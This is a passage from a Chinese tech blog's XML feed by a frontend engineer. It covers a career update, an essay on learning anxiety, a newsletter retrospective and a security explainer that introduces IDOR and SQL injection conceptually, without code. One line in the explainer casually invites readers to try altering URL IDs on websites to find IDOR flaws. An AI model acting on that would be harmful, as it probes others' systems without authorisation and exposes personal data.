Software engineer</p><p>原本已經要回去的台灣大學，就這樣再次被我拋棄（還要再辦一次休學，實在是有夠麻煩）</p><p>現在回想起來，還是有種如夢似幻的感覺。機會就這樣靜悄悄地、輕輕地走了進來，我的人生之路就這樣突然地轉了 21 度</p><p>很多人問我什麼時候飛，我猜應該沒那麼快 on board，最近在處理申請工作簽證的事情，可能要等簽證申請成功之類的才會過去新加坡。我自己推測最快也要 10 月了，還可以再放一個月的暑假</p><p>其實我一直都滿想出國工作，但最擔心的就是簽證問題，因為很多地方的工作簽證都要看學歷，希望這次簽證申請能夠順利。不過，就算最後因為簽證搞不定而有異動的話，我也想好備案了</p><p>最後要特別感謝胡立，因為我發現他好像比我想像中的還要厲害一點，但我們都知道，還是有很多很多很多很多很多很多需要學習的地方</p><p>台大掰，新加坡嗨！</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>來談談工程師的知識焦慮</title>
      <link href="/2021/09/04/what-to-learn-b85ee24c3e8/"/>
      <url>/2021/09/04/what-to-learn-b85ee24c3e8/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/what-to-learn-b85ee24c3e8/0__tfAXIpeQ7GK7wqGF.jpg"></p><p>在這個網路已經發展許久的時代，最不缺的就是學習資源，但或許有些人就這樣在知識汪洋裡迷了航，不知道該往哪去，也不知道終點在哪——因為它可能根本沒有終點。</p><p>在工程師的討論區中常常看到有人發問，問著自己下一步該往哪去，是要學 A 呢，還是學最近好像很熱門的 B，或是回去學習那些重要的基礎 C。身為一個前端工程師更是如此，時不時就有新的框架或是函式庫出現，讓有些人覺得自己學不動了，怎麼這麼多東西要學。</p><p>曾經我也是這樣的。</p><p>每天早上看著 <a href="https://news.ycombinator.com/">Hacker news</a>，關注國外科技業的第一手情報，看看有哪些新的事件；我也看<a href="https://juejin.cn/frontend">掘金</a>的前端版，看著一篇篇所謂的「乾貨」，從中學習我不知道的 JavaScript 技巧以及前端的知識。儘管我每天看，但總覺得自己好像沒有學完的一天，每天都有新的知識可以汲取，可以學習。</p><p>在這樣的知識汪洋裡，會有「學不完」的知識焦慮是很正常的，那該怎麼辦？</p><p>我選擇放棄，對，就是放棄。</p><p>我開始不去主動關心那些知識來源，只透過 Facebook 或推特之類的社群網站主動追蹤，讓他們推播給我。而那些乾貨技術文章，是真的寫得不錯，但問題是，我真的需要這些知識嗎？</p><p>我記得六七年前 AngularJS 正夯的時候，我跟朋友說我要去學 AngularJS，但我沒有。React 在台灣開始紅起來的時候，我因為工作的關係去學了，後來也應用在工作上。到後來 Vue 在台灣越來越多人採用，我也說我要去學 Vue，體驗一下不同框架，但我後來也沒有真的去學，也沒怎麼樣。</p><p>少了那些「前端工程師面試必學知識」、「帶你看看 React 實作原理」、「你不知道的 JavaScript」以後，真的對我有影響嗎？我真的就因此什麼都不會了嗎？顯然不是。</p><p>知識本來就是無窮無盡的，新的技術會一直出現，因此知識本來就是個沒有盡頭的汪洋，你再怎麼努力都脫離不了。在這樣的前提下，我認為重要的事情只有一件，那就是找到自己的方向。</p><p>原本你不知道東西南北要往哪走，於是就四處晃晃，這邊去一下，那邊也去一下。確立方向以後，假設要走的是北方，那東南西方的東西你就幾乎不會碰到了，但沒關係，因為代表那些沒有這麼重要。</p><p>我不會 Angular，我不會 Vue，我不會 Svelte，我不會 WebAssembly，我不會實作 Promise，我沒辦法講出 React 底層到底是怎麼運作的，我也不懂那些奇形怪狀的 JavaScript 考題。</p><p>但我在工作上可以用我熟悉的 React 把功能完成，修 bug 也可以找到根本原因並且修掉，寫 code 時可以考慮到擴充性但不要過早最佳化，實作時會想到一些 edge case。</p><p>我不懂演算法跟資料結構，但如果有天我想面試 FAANG，我會去學。我不懂 React 底層在幹嘛，但如果有天我想面試會考這個的公司，我會去學。我不懂 JavaScript 的所有奇怪部分，但如果有天我想成為 JavaScript 大師，我也會去學。</p><p>知識焦慮產生的最大原因之一，我覺得是因為沒有方向，沒有目的。因為沒有目的，所以就像無頭蒼蠅一樣到處亂撞，什麼都很重要於是什麼都學，最後連自己學了什麼都不知道。</p><p>如果你覺得自己找不到方向，我有幾個建議可以聽聽。假設你已經在工作了，研究的方向就先放在工作上會用到的工具，例如說工作在用 Next.js，就去研究這套在幹嘛，怎麼使用。</p><p>如果工作上的你都會了，或者是還在找工作的話，那就去看徵才網站，找一間你想去的夢幻公司，開始研究他們用的那些工具跟框架怎麼使用，先把這個當作是你的方向，至少可以幫你縮減學習的範圍。</p><p>有些人可能會想說：「怎麼上面都只叫大家學工具，不是都說基礎跟原理比較重要嗎？」，我認為核心知識的原理跟應用是相輔相成的，舉例來說像是 design pattern，新手常犯的錯就是學了之後想要趕快應用在工作上，結果就過度工程化了，用在根本不需要它的地方。</p><p>但我認識這東西是從實作開始，我寫 Android 的時候就看見了 <a href="https://developer.android.com/reference/android/app/AlertDialog.Builder">Builder pattern</a> 的應用，先看過之後再去學 design pattern，我覺得比較容易融會貫通，知道這些可以用在哪裡。</p><p>所以從學習工具跟框架開始，我認為也是不錯的一條路。況且從這些開始，並不代表就真的不去碰觸原理跟核心知識，這是一個順序的問題。先從應用開始，對於原理感到好奇之後再去看原理，這樣的順序有時候比顛倒過來好。</p><p>舉例來說，你想知道 React 原理你必須先寫過 React，不然看起來沒感覺。你想知道 Promise 怎麼實作，必須要先會用，不然你也不知道為什麼要這樣做。</p><p>學習本來就是永無止盡的，因此「學不完」是很正常的一件事，如果因為學不完而困擾，是一種庸人自擾。學不完是肯定的，因此重點不是學不學得完，而是目標跟順序，哪些是重要的？哪些是應該先學的？</p><p>有了方向以後，才能擺脫這種知識焦慮，因為你會很清楚哪些知識現在不重要，就可以不去管它。我寫 React，我當然從 React 的知識開始研究，我不會因為我不懂 Angular 或是 Vue 而焦慮，因為那些對現在的我來說都沒這麼重要。</p><p>如果你發現自己困在知識汪洋裡，可以仔細想想，你需要的可能不是更多的資源或是更多的時間，因為那些都沒有幫助。你需要的是一個方向，一個讓你可以專注眼前目標，忽略其他雜訊的方向。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我把我的青春給你——在 TechBridge 的這六年</title>
      <link href="/2021/08/09/techbridge-2ff7398a17ba/"/>
      <url>/2021/08/09/techbridge-2ff7398a17ba/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/techbridge-2ff7398a17ba/1__u1s22tZAzgpWM__zrtqSs9A.png"></p><p>TechBridge Weekly 是一個專門分享技術相關文章的週刊，內容會包含幾個 curator 挑選的文章以及簡單的介紹，分享一些好文給大家。就像國外可能也有 JavaScript Weekly 那樣，只是我們的主題比較廣泛。</p><p>除了週刊之外，我們還有 <a href="https://blog.techbridge.cc/">TechBridge 技術共筆部落格</a>，每一週都會有新的原創文章，也曾開放過讓大家都可以來投稿。</p><p>今天是 TechBridge 週刊第 300 期的出刊日，也是這個周刊正式劃下句點的時刻。在跟大家分享為什麼會停刊以及我個人的心得之前，我想先簡單記錄一下這六年來的故事。</p><h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>TechBridge 團隊自始至終都只有四個人，我、KD、Arvin 還有 Po Jen。而這四個之中的核心人物，非 KD 莫屬。</p><p>我已經忘記我是怎麼跟 KD 認識的，跑回去翻臉書的第一句對話紀錄也看不出個端倪，但應該是從臉友先開始的。</p><p>2015 年 6 月，那時我 21 歲，已經休學當完兵了，剛開始第一份工作沒多久，收到了 KD 的訊息，問我說有沒有興趣一起寫技術共筆部落格。</p><p>我說我怕寫得不夠技術，以前都是隨便寫一些心得跟筆記，比較沒有寫過單一主題的技術文章，怕寫得不夠好。</p><p>他說：「所以這是學習機會啊！如果你都是做以前的事情，就沒有踏出舒適圈，就不會學習成長，就像休學一樣XD」</p><p>仔細想一想發現十分有道理，於是衝著這句話，我就果斷 +1 了。</p><p><img src="/img/techbridge-2ff7398a17ba/1__IscTGNUYlZ2FyAAgumOsJA.png"></p><p>後來 KD 去忙一些其他事情，一直到十月中的時候收到他的訊息以及已經創好的 TechBridge Weekly 網站（以下簡稱 TB 好了），問我有沒有興趣參加 TB Weekly，一起來挑選文章然後寫介紹。</p><p>我記得那時候我好像也有訂閱幾個周刊，例如說國外的 JavaScript Weekly，中國的<a href="https://toutiao.io/">開發週頭條</a>，以及臺灣的<a href="https://github.com/CodeTengu/HyakkiYagyo">碼天狗</a>。</p><p>除了這些定期的資訊之外，那時候我每天都會花一些時間去看新的文章，例如說 Hacker News 或者是科技新聞網站。大概是有著某種程度的資訊焦慮吧，或也可能只是想要讓自己走在時代的尖端，掌握第一手或第二手的資訊。</p><p>因此挑文章並且寫介紹這件事，完全難不倒我。因為就算沒有負責編輯 TB Weekly，我每天也都在做類似的事情。</p><p>還記得團隊成員有四個人嗎？除了我與 KD 之外的兩人，也都是 KD 的好友，意思就是這個團隊是由 KD 建起來的，他就是核心。</p><p>我們團隊第一次見面的日子我已經忘了，但推測應該也是 2015 年中或是年底，那時 KD 還在當替代役，Arvin 在那時的紫色公司工作，而 Po Jen 則是在當研發替代役。第一次聚會大概就是互相認識一下，然後聊一下對 TB Weekly 未來的期望等等。</p><p>那時我加入的想法其實很簡單，也沒什麼太遠大的夢想，就只是想說反正我很閒，而且這專案聽起來滿有趣的，再加上本來就有在看文章，所以也只是順手貼在週刊裡面，還少了要自己找地方備份連結的煩惱。</p><p>2015 年 11 月 6 號，KD 在臉書社團發了宣傳的貼文：</p><p><img src="/img/techbridge-2ff7398a17ba/1__kYr5MeW0d2iorx8jSTB__Gw.png"></p><p>而隔天，TB Weekly 就寄出了創刊號，正式宣告著 TB Weekly 的開始。</p><h3 id="TB-weekly-的協作方式"><a href="#TB-weekly-的協作方式" class="headerlink" title="TB weekly 的協作方式"></a>TB weekly 的協作方式</h3><p>在週刊系統的部分，因為我們四個成員都是工程師，所以一定想過要自己弄一套，但仔細想想就會發現其實有些地方滿麻煩的，而且要花的時間其實不少，因此還是花錢了事。</p><p>最後我們是用一套叫做 <a href="https://goodbits.io/">Goodbits</a> 的系統，依照訂閱人數來計算費用，到最後接近 6000 個訂閱者時，一個月大約是 50 元美金。這開銷其實還不少，但現成的解決方案都是差不多的價錢，而且一旦用了就懶得換了，要整套搬走也需要滿多心力。</p><p>週刊裡大概有幾個分類，每個人都負責一小部分，分完之後每週就是自己在出刊以前挑選文章，寫好介紹之後放進去。我記得我一開始是負責 web 跟 mobile 的部分，一週要準備六篇文章（在我沒寫 mobile 之後硬要找文章很痛苦，跟大家討論過後就把那分類拿掉了）。</p><p>而出刊以及標題都是交給 KD 負責，我們其他人就是把文章放進去就好。所以如果不用特別找文章的話，其實是很快的，大概週六早上花個半小時就可以搞定。</p><p>那時候我還有一陣子會記錄每週的一些數據，例如說開信率以及每個板塊的點擊率等等，持續了半年之後覺得心累就沒有繼續做了：</p><p><img src="/img/techbridge-2ff7398a17ba/1__ns5LmMQXZrhoUqpiKCLfxA.png"></p><h3 id="TB-共筆部落格"><a href="#TB-共筆部落格" class="headerlink" title="TB 共筆部落格"></a>TB 共筆部落格</h3><p>週刊經營大約四個月的時間以後，在 2016 年 3 月 19 日，<a href="https://blog.techbridge.cc/2016/03/19/about/">TechBridge 技術共筆部落格</a>正式開張了。</p><p>最早其實 KD 就是想做技術共筆部落格，後來先做週刊的詳細原因我也忘記了，不過我猜可能是能夠先利用週刊培養一群受眾，之後要推部落格比較方便，或更進一步想形成一個社群。</p><p>在 TB 剛開始的時候，其實就有一項目標是週刊裡的文章應該像開發者頭條那樣，可能有個網站讓大家丟連結上來，每個人都可以分享文章，然後週刊就只是寫個程式去整理最熱門的那幾篇，做到全自動化。</p><p>不過這是很困難的一件事，光就分享文章這點來說，我滿喜歡的 <a href="https://kaif.io/">kaif.io</a> 也沒做起來。比起某個網站，大家還是更習慣在 Facebook 社團之類的地方分享連結。所以如果真的想做，做個技術社群的爬蟲可能比較有希望一點。</p><p>一開始部落格只有我們四個，而中間也有大約十個左右的作者來投稿，讓我們把文章刊在這個共筆部落格。那時採取的方式就是他們自己來發 <a href="https://github.com/TechBridgeWeekly/blog-starter-kit/issues?q=is:pr+is:closed">PR</a>，然後我們幾個大概看一下，覺得沒什麼問題就可以 merge。</p><p>從部落格正式開張到現在大概有四年半了，總共有 300 多篇文章。而這四年半，大概也是我在技術文章的寫作上成長最快的時期吧。</p><p>在加入之前都寫一些短短的心得筆記，加入之後想說一個月一篇，準備時間拉長了，而且感覺這個共筆部落格是要認真經營的，寫出來的文章品質不能太差，因此就特別規劃了一些主題在寫，完整性比較高。</p><p>也可以從文章主題看見我個人的職涯發展，因為我早期的文章都是從工作上的靈感而來。比如說《<a href="https://blog.techbridge.cc/2016/03/24/android-decompile-introduction/">人人都會的 Android Apk 反編譯</a>》跟《<a href="https://blog.techbridge.cc/2016/06/18/redis-introduction/">資料庫的好夥伴：Redis</a>》這兩篇，是因為我第一份工作寫 Android 也寫前後端。</p><p>之後去了佛心公司，把面試經驗寫成了《<a href="https://blog.techbridge.cc/2017/01/27/interview-review/">記一次軟體工程師面試心得</a>》，後來寫的《<a href="https://blog.techbridge.cc/2016/12/03/livestreamming-hls-note/">直播協定 hls 筆記</a>》也呼應到了那時負責的直播平台。其他 Cookie 或是講 CSRF 的文章，也都是因為工作上碰到這些問題，才不得不去研究。</p><p>如果你想寫技術文章卻又不知道從何開始，那我會推薦從工作上的問題開始。因為這個與你最切身相關，而且你本來就要解掉。把問題解掉之後花一點時間整理成文章公開分享，一方面可以留下筆記，另一方面可以增加自己的產出，沒有什麼比這個更超值的了。</p><p>除了工作上的靈感以外，也會花點時間研究自己有興趣的主題，例如說 hoisting 之類的東西，也花了不少時間在寫那一系列的文章。</p><p>如果想要有穩定的產出，那靈感蒐集非常重要。因為如果沒有靈感，就不知道寫什麼主題，文章就會寫不出來。我自己有個筆記本會把靈感記下來，因為沒有寫下來的話一定忘記。對這邊有興趣的話，可以參考：<a href="/2019/08/22/how-do-i-write-965328ae91fe/">我是如何完成一篇文章的？</a></p><p>另外，對於懶惰的我來說，TB 的共筆起到了關鍵的督促作用，每個月都要出一篇文章，這個頻率既不會讓人中斷，也不會壓得無法喘息，是我覺得非常適當的頻率。</p><h3 id="跟著-TB-一起成長"><a href="#跟著-TB-一起成長" class="headerlink" title="跟著 TB 一起成長"></a>跟著 TB 一起成長</h3><p>TB Weekly 目前大概有 6000 個訂閱者，開信率大概是 25%。我們的第一個里程碑大概是千人訂閱的時候吧，但我也忘記是什麼時候了。我只記得大概從 5000 人開始，成長速度就變得特別緩慢，大概是能吸引到的受眾都差不多了。</p><p>加入 TB 的時候，我剛開始第一份工作，而其他三人也是差不多的狀態。現在六年過去了，我也已經工作了五年多，中間還去了一趟新加坡再回來。其他人也是都有各自的發展，有人在美國，有人在日本，有人辭了工作自己創業。</p><p>在這幾年間，我們其實也有做過一些新的嘗試，例如說：</p><ol><li>找其他 curator 一起進來</li><li>找公司置入廣告來打平支出</li></ol><p>但這兩項最後都不了了之了，我自己覺得最大的兩個原因大概是「沒有非要不可的理由」以及「沒有付出太多時間」。</p><p>TB Weekly 其實一直以來都是個很穩定的東西，只是我們有把文章放上去，就不會停刊。有沒有找到廣告打平支出或甚至是賺錢，其實也不是必要的，畢竟我們本來就沒打算靠這賺錢，而系統的支出也沒有到付不起的程度。</p><p>而我自己其實也沒有想過 TB 未來會變成什麼樣子，我就只是每個禮拜放著文章，每個月寫著部落格，就這樣繼續下去。</p><h3 id="TB-Weekly-的結束"><a href="#TB-Weekly-的結束" class="headerlink" title="TB Weekly 的結束"></a>TB Weekly 的結束</h3><p>2021 年 3 月 28 日，TB 的線上尾牙。</p><p>這場線上會議中除了閒話家常之外，還一併討論了 TB 未來發展的方向。就如同上面說的一樣，TB 剛開始的時候，我們四個要嘛還沒出社會，要嘛就是社會新鮮人。而六年過去了，有人在國外工作了，也有人結婚有家庭了。</p><p>我們能付出的時間，已經跟以前不同了。</p><p>儘管有些東西還想嘗試，但那需要時間，如果沒辦法付出時間的話，什麼都做不到。在這場會議中我們討論了 TB 的未來，我自己負荷量是還好，但跟其他成員一樣，對於「找文章」這件事情其實已經有著倦怠感，有時候還會「為找而找」，失去了剛開始的初衷。</p><p>開頭有講過，我剛出社會的時候會去找很多文章來看，所以要分享文章完全不成問題。但後來就不會了，因為我把時間拿去做更重要的事了，對吸收這麼多看似有用但其實沒什麼用的資訊不太感興趣。文章的來源也從國外網站慢慢變成 Medium、臉書社團以及推特。</p><p>好文的比例變多了，但整體數量相對地也變少了。因此有時候文章不夠用的話，就必須特別去找出來。</p><p>雖然說找文章這件事情可能不需要太多時間，真的硬要找，也是一小時之內可以解決的事情，但若是每週都要這樣做著重複且無聊的事情，不免會讓人感到有些疲憊。</p><p>在會議中我們有討論過把 TB 改成雙週刊或是月刊的形式，看能不能減輕大家的負荷。不過就算這樣做，也只是把問題延後而已。</p><p>最後，我們重新思考了一下 TB Weekly 存在的目的是什麼？我們想達成的目標是什麼？</p><blockquote><p>想幫助更多人看到一些不錯的技術文章</p></blockquote><p>而這個目標其實已經達成了，就算沒有 TB Weekly 也一樣。</p><p>例如說蓬勃發展的各個臉書討論區，無論是前端還是後端，都有不少網友會分享品質不錯的文章以及新的資訊，或者是自己寫的原創文章。在週刊方面，也有著後起之秀 <a href="https://weekly.starbugs.dev/">StarBugs Weekly</a>。</p><p>就算繼續經營著 TB Weekly，以我們的現況來說，也不會有什麼改變，就只是這樣持續找著文章，維持每週出刊。但這樣的例行性公事對我們來說已經不同了，我們需要特地花時間去找，才能維持這樣的出刊頻率。</p><p>總而言之，大概就是有點累了，然後沒有下一個目標。TB Weekly 對我們來說是個用熱情跟時間在維護的專案，隨著生活上或職涯上的發展，能付出的時間也變得越來越少。</p><p>與其讓 TB Weekly 這樣慢慢凋零，不如讓它在一個適當的時機點結束。而這個時機點，顯然就是即將來臨的 300 期。</p><p>於是那時就定案了，300 期就是 TB Weekly 的最後一期。</p><h3 id="心得感想"><a href="#心得感想" class="headerlink" title="心得感想"></a>心得感想</h3><p>能夠陪伴著 TB 一路成長，這六年來我學到很多，也成長了許多。雖然說在加入 TB 之前我就開始寫文章了，但真正在文章品質上的飛躍進步，是加入 之後才獲得的寶貴經驗。大概就是種魚幫水，水幫魚的感覺吧？我幫助 TB 成長，TB 也幫助著我成長。</p><p>這篇原本想寫得更長的，但若是刻意為之，總有種為賦新詞強說愁的感覺。對我來說，這六年其實是很平淡的，因為 TB 已經融入在我的生活裡面。禮拜五晚上放文章，規劃著自己下個月 blog 要寫什麼，這些都是再習慣不過的事情。</p><p>就算是出國，就算是旅遊，只要筆電帶著還是會做相同的事情。一樣可以找文章，一樣可以寫作。</p><p>我很開心讓 TB 變成我習慣的一部分，也很開心看著 TB Weekly 在一個最適合的時機點，結束了它的使命。</p><p>有些讀者應該會覺得 TB Weekly 停掉很可惜，如果可以的話，希望你們能把從這邊學到的東西轉化成動力，在未來的某一個時刻，也做著跟我們類似的事情。</p><p>這種東西大概就是這樣吧，是需要傳承的。就像我們可能也是看到不錯的 weekly 才有了自己創辦的想法；希望也有人看著我們的時候，覺得能辦個 weekly 真棒，然後有天就真的找了幾個朋友做了類似的事情。</p><p>到時候讓我變成讀者吧，換我期待著你們的出刊。</p><p>如果有什麼想對我們說的，可以在這邊留言，我們四個都看得到：<a href="https://github.com/TechBridgeWeekly/TechBridge-Weekly/issues/27">https://github.com/TechBridgeWeekly/TechBridge-Weekly/issues/27</a></p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>為什麼忘記密碼時只能重設，不把舊密碼告訴我？</title>
      <link href="/2021/07/09/why-only-reset-password-not-retrieve-password-aa7cfb8699f1/"/>
      <url>/2021/07/09/why-only-reset-password-not-retrieve-password-aa7cfb8699f1/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/why-only-reset-password-not-retrieve-password-aa7cfb8699f1/0__d__btmcK3StRPxigr.jpg"></p><p>（原文發佈於 Cymetrics Tech Blog：<a href="https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/">為什麼忘記密碼時只能重設，不把舊密碼告訴我？</a>）</p><p>某天小明在整理他的我的最愛（到底誰的），發現了一個以前很常逛，但已經將近半年多沒去的一個論壇。小明想回去看看那邊變得怎麼樣了，於是點進去那個論壇，輸入了帳號密碼，得到了密碼錯誤的回覆。</p><p>嘗試了幾次之後，系統提示小明可以使用「忘記密碼」的功能，所以小明填了自己的 email 之後去信箱收信，發現系統傳來一個「重設密碼」的連結。雖然說最後小明成功利用重新設定的密碼登入，但有個問題讓他百思不得其解：</p><blockquote><p>「奇怪欸，幹嘛要我重設密碼，為什麼不把舊的密碼寄給我就好？」</p></blockquote><p>應該有許多人都跟小明一樣，有過類似的疑惑。把舊密碼寄給我不是很好嗎，幹嘛強迫我換密碼？</p><p>這一個看似簡單的問題，背後其實藏了許多資訊安全相關的概念，就讓我們慢慢尋找問題的答案，順便學習一些基本的資安知識吧！</p><p>先提醒一下，雖然說前半段看起來可能跟文章主題無關，但好酒沉甕底，我保證最後會把這些東西關聯起來。</p><h3 id="被偷走的資料庫"><a href="#被偷走的資料庫" class="headerlink" title="被偷走的資料庫"></a>被偷走的資料庫</h3><p>大家應該很常看到新聞說哪個網站的資料又被偷走了，顧客個資全部都外洩出去。像是國外知名的網域代管網站 <a href="https://www.inside.com.tw/article/25661-godaddy-email-addresses-passwords-security-breach-managed-wordpress-ssl-keys">GoDaddy</a> 就外洩了 120 萬筆用戶資料，而台灣之前也有過<a href="https://www.ithome.com.tw/news/146427">愛心協會捐款個資外洩</a>的狀況發生。</p><p>這邊我想帶大家探討的兩個問題是：</p><ol><li>資料真的這麼容易外洩嗎？</li><li>資料外洩之後，可能造成什麼後果？</li></ol><p>我們先來看第一個問題，有很多安全性的漏洞可以造成資料外洩，而有些漏洞的攻擊方式，比你想的還簡單一百倍。</p><p><img src="/img/why-only-reset-password-not-retrieve-password-aa7cfb8699f1/0__x2IFkXrnxX8y8oPk.jpg"></p><p>你想像中的駭客可能像上面那樣，打著一大堆不知道在幹嘛的指令，畫面上出現很多黑底白字或是綠字的畫面，完全搞不懂在幹嘛，但是做著做著網站就被打下來了。</p><p>而事實上有些漏洞，可能在網址列上面改幾個字就攻擊成功了，就算你不懂任何程式也做得到。</p><p>舉例來說好了，假設今天有個購物網站，你買了一些東西之後送出訂單，訂單成立後跳轉到訂單頁面，上面有著一大堆你的個資，例如說：姓名、收貨地址、聯絡電話以及 Email 等等。</p><p>然後你發現訂單頁面的網址是 <a href="https://shop.huli.tw/orders?id=14597">https://shop.huli.tw/orders?id=14597</a></p><p>而正好你的訂單編號也是 14597，在好奇心的驅使之下，你就試著把數字改成 14596，然後按下 Enter。</p><p>當網站載入完成之後，你竟然還真的能看到編號為 14596 的訂單，上面出現一個你不認識的人的姓名、收貨地址、聯絡電話跟 Email。</p><p>有些攻擊就是這麼樸實無華且枯燥，只要改個字就能看到屬於其他人的資料。這時候如果你會寫程式的話，就可以寫個腳本自動去抓 id 是 1 一直到 id 是 15000 的資料，你就拿到了這個購物網站 15000 筆訂單的資訊，也就是一萬多個顧客的個資。</p><p>這過程中沒有什麼黑底白字的畫面，也不用一直瘋狂打字，唯一需要的只有改數字，個資就輕鬆到手。</p><p>這類型的漏洞有個專有名詞，稱為 IDOR，全名是：Insecure direct object references，大約就是不安全的直接資料存取的意思。漏洞產生的原因就是工程師在開發時，並沒有注意到權限控管，因此讓使用者能存取到其他人的資料。</p><p>有些人看到這邊可能以為我只是為了文章淺顯易懂，所以才舉一個簡化的例子，現實生活中的攻擊才沒這麼簡單。</p><p>這句話算是對了一半，大部分的網站確實都不會有這麼明顯的一個漏洞，攻擊方式會更複雜一點。<strong>但可怕的是，還真的有些網站就是這麼簡單，就是改個數字就可以拿到別人的資料。</strong></p><p>台灣有一個網站叫做 <a href="https://zeroday.hitcon.org/">HITCON ZeroDay</a>，是由台灣駭客協會所維護的漏洞回報平台。有些人發現漏洞之後可能會竊取個資拿去賣，從事非法行為，也有些人發現漏洞只是為了鍛鍊技術，並沒有想要做什麼壞事。</p><p>因此就可以透過這個平台進行回報，回報漏洞之後負責維護平台的志工們會幫你驗證漏洞，驗證過後回報給負責的廠商，讓他們去修復漏洞。</p><p>這個平台上的漏洞在修復過後隔一陣子會公開，或者儘管廠商沒有回報修復，過一陣子（例如說兩個月）後也會公開，因此在這平台上可以找到許多公開的漏洞，看過之後你大概就不會想在網站註冊時留下真實個資了…</p><p>例如說這兩個就是 IDOR 的真實漏洞：</p><ol><li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2021-00206">享健身xarefit 任意訪問&#x2F;下載所有會員個資</a></li><li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2021-00260">DoorGods 防疫門神實聯制系統IDOR導致個資外洩</a></li></ol><p>對，不要懷疑，就真的只是在網址上改個數字而已這麼容易。</p><p>以後只要看到網址列上有這種數字，就可以試著去改改看，搞不好不會寫程式的你也可以發現 IDOR 的漏洞。</p><p>除了這種只要改個東西的漏洞之外，還有另外一個很常見但是需要一點技術能力才能攻破的漏洞，叫做 SQL Injection。</p><p>先來講講 SQL 是什麼，簡單來說就是跟資料庫查詢東西的一種程式語言。既然說是語言那就會有固定語法，若是以中文舉例，大概就像是：</p><blockquote><p><em>去找「訂單資料」，給我「id 是 1 的」，按照「建立時間」排序</em></p></blockquote><p>用「」框起來的部分代表可以變動，而其他關鍵字例如說「去找」、「給我」這些都是固定的，因為語法要固定才能寫程式去解析。</p><p>同樣以上面假想的購物網站為例，如果網址是 <a href="https://shop.huli.tw/orders?id=14597">https://shop.huli.tw/orders?id=14597</a>，那網站去跟資料庫拿資料時，指令大概就是：</p><blockquote><p><em>去找「訂單資料」，給我「id 是 14597 的」</em></p></blockquote><p>因為網址列上的 id 是 14597 嘛，所以這個 id 就會被放到查詢的指令去，如果 id 是別的，那查詢的指令也會不一樣。</p><p>這時候如果我的 id 不是數字，而是「1 的順便給我使用者資料」，查詢就變成：</p><blockquote><p><em>去找「訂單資料」，給我「id 是 1 的順便給我使用者資料」</em></p></blockquote><p>那整個網站的使用者資料就順便被我抓下來了。</p><p>這個攻擊之所以叫做 SQL injection，重點就在於那個 injection，攻擊者「注入」了一段文字被當作指令的一部分執行，所以攻擊者就可以執行任意查詢。</p><p>比起上面講的 IDOR，SQL injection 通常會更為致命，因為不只是訂單資料本身，連其他資料也會被一起撈出來。所以除了訂單資料，會員資料跟商品資料都有可能一起外洩。</p><p>這邊也隨便找兩個公開的案例：</p><ol><li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2020-00276">北一女中網站存在SQL Injection漏洞</a></li><li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2021-00052">桃園高中 網站 SQL injection</a></li></ol><p>而防禦方式就是不要把使用者輸入的「1 的順便給我使用者資料」直接當作指令，而是經過一些處理，讓整段查詢變成：「給我 id 是：『1 的順便給我使用者資料』的資料」，那因為沒有這個 id，所以什麼事也不會發生。</p><h3 id="個資洩漏了，然後呢？"><a href="#個資洩漏了，然後呢？" class="headerlink" title="個資洩漏了，然後呢？"></a>個資洩漏了，然後呢？</h3><p>前面我們已經看到了針對那些沒有做好防禦的網站，個資外洩是多麽容易的一件事情。</p><p>那個資洩漏之後，對使用者會有什麼影響呢？</p><p>大家最感同身受的應該就是詐騙電話吧，例如說某些買書的網站或是訂房網站，打過來跟你說什麼要分期退款，為了博取你的信任，連你買了哪本書，訂了哪個房間，或是你家地址跟姓名全都講得出來。</p><p>這些都是因為資料外洩的緣故，詐騙集團才會知道的這麼清楚。</p><p>但除了這些個資以外，還有兩個東西也會外洩，那就是你的帳號跟密碼。</p><p>也許你會想說：「不就帳號跟密碼嗎，我就在那個網站上面改密碼以後再用就好啦！」</p><p>事情也許沒有你想的這麼簡單。如果你沒有用密碼管理軟體的話，我大膽猜測你所有的密碼可能都是同一組。因為怕記不起來嘛，所以乾脆都用同一組密碼。</p><p>這時候如果帳密外洩，駭客是不是就可以拿這組帳密去其他服務試試看？</p><p>拿去登你的 Google，登你的 Facebook，這時候用同一組密碼的人就會被登進去。所以從表面看只是一個購物網站被入侵，但造成的結果卻是你的 Google 還有 Facebook 也一起被盜了。</p><p>所以，有時候某個網站被盜帳號可能不是那個網站的問題，而是駭客在其他地方拿到了你的帳號密碼，就來這邊試試看，沒想到就中了。</p><p>對於網站的開發者而言，保護好使用者的個資是天經地義的事情，保護密碼也是，有沒有什麼好方法可以保護密碼呢？</p><p>加密嗎？把密碼用某些演算法加密，這樣資料庫儲存的就會是加密後的結果，儘管被偷走了，駭客只要沒有解密的方法就解不開。</p><p>聽起來似乎是最安全的做法了，但其實還有一個問題，那就是網站的開發者還是會知道怎麼解密，如果有工程師監守自盜怎麼辦？他還是可以知道每個使用者的密碼是什麼，可以把這些資訊拿去賣或者是自己利用。</p><p>嗯…似乎我們也不能怎麼樣，因為無論如何，開發者都需要有方法知道資料庫存的密碼究竟是多少吧？不然在登入的時候怎麼確認帳號密碼是對的？</p><p>再者，這樣聽起來應該夠安全了，要怎麼樣才能更安全？難道要連網站的開發者都無法解密，都不知道密碼是什麼才夠安全嗎？</p><p>Bingo！答對了，就是要這樣沒錯！</p><h3 id="沒有人知道你的密碼，包括網站本身"><a href="#沒有人知道你的密碼，包括網站本身" class="headerlink" 